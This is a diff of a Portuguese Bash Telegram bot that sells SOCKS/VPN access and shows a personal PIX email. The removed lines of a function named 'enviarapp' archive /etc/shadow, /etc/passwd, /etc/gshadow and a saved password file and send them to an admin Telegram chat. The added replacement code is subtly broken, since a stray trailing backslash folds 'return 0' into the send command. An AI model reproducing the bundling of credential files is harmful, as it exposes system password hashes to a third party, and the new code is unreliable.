@@ -21,14 +21,14 @@ ShellBot.username
 # - Funcao menu
 menu() {
     local msg
-        msg="=×=×=×=×=×=×=×=×=×=×=×=×=×=\n"
-        msg+="<b>SEJAM BEM VINDOS</b>\n"
-        msg+="=×=×=×=×=×=×=×=×=×=×=×=×=×=\n\n"
+        msg="=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=\n"
+        msg+="<b>             SEJAM BEM VINDOS</b>\n"
+        msg+="=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=\n\n"
         msg+="<b>VENDEDOR OFICIAL DO SOCKSLITE</b>\n"
 	msg+="<b>VALOR:</b> 10 MENSAL\n"
-	msg+="⚠️<b>APENAS CHAME SE REALMENTE FOR COMPRAR</b>⚠️\n"
 	msg+="<b>PIX EMAIL: </b>rodrigorocha5733@gmail.com\n"
-	msg+="<b>APERTE EM COMPRAR ACESSO E ENVIE SEU COMPROVANTE</b>\n"
+	msg+="<b>APERTE EM “COMPRAR ACESSO” E ENVIE SEU COMPROVANTE</b>\n\n"
+        msg+="⚠️<b>APENAS CHAME SE REALMENTE FOR COMPRAR</b>⚠️\n"
         ShellBot.sendMessage --chat_id ${message_chat_id[$id]} \
         --text "$(echo -e $msg)" \
         --reply_markup "$keyboard1" \
@@ -152,13 +152,8 @@ fi
 
 #enviar app
 enviarapp() {
-    rm /root/backup.vps 1>/dev/null 2>/dev/null
-    ShellBot.answerCallbackQuery --callback_query_id ${callback_query_id[$id]} \
-        --text "♻️ CRIANDO BACKUP DE USUARIOS"
-    tar cvf /root/backup.vps /root/usuarios.db /etc/shadow /etc/passwd /etc/group /etc/gshadow /etc/bot /etc/SSHPlus/senha 1>/dev/null 2>/dev/null
-    ShellBot.sendDocument --chat_id ${id_admin} \
-        --document "@/root/backup.vps" \
-        --caption "$(echo -e "♻️ BACKUP DE USUARIOS ♻️")"
+    ShellBot.sendDocument --chat_id ${message_chat_id[$id]} \
+        --document "@/root/CONECT4G.apk" \
     return 0
 }
 
